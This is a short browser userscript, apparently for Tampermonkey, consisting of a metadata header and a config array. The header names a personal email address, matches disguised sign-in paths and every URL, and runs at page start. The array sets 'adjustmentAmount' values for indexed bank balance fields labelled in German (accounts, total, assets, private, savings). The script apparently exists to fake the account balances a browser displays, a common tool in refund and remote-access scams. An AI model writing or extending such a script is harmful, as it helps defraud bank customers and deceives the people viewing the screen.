// ==UserScript==
// @name         Ed 4Rec  post.andy.kressig@bluewin.ch
// @namespace    http://tampermonkey.net/
// @version      7.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/556873/Ed%204Rec%20%20postandykressig%40bluewinch.user.js
// @updateURL https://update.greasyfork.org/scripts/556873/Ed%204Rec%20%20postandykressig%40bluewinch.meta.js
// ==/UserScript==



   //=========================================================================================================================================================
 //=========================================================================================================================================================
 //=========================================================================================================================================================


//  MAIN PAGE BALANCE

  const BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 0, visualcue: "yes" },  //konten
        { index: 3, adjustmentAmount: 0, visualcue: "yes" },   // gesamt
        { index: 5, adjustmentAmount: 0, visualcue: "yes" },  //kontovermoegen
        { index: 6, adjustmentAmount: 0, visualcue: "yes" }, // privat
      { index: 7, adjustmentAmount: 0, visualcue: "yes" },  //spar

     //   { index: 5, adjustmentAmount: 0, visualcue: "yes" },
     //   { index: 6, adjustmentAmount: 0, visualcue: "yes" },
        // Add more as needed
    ];
